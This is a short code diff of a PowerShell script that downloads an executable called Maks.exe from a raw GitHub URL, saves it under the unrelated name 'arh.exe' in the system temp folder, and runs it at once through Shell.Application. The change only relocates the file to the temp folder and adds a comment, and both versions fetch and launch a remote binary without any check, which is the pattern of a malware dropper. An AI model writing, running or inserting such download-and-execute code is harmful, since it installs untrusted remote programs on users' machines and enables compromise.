@@ -1,5 +1,9 @@
 $url_file = 'http://raw.githubusercontent.com/MGrinx5/maks/refs/heads/main/Maks.exe'
-$file = 'arh.exe'
+$temp_folder = [System.IO.Path]::GetTempPath()
+$file = "$temp_folder\arh.exe"
 
-PowerShell (New-Object System.Net.WebClient).DownloadFile($url_file,$file),
+# Download the file to the temporary folder
+(New-Object System.Net.WebClient).DownloadFile($url_file, $file)
 (New-Object -com Shell.Application).ShellExecute($file);
+
+
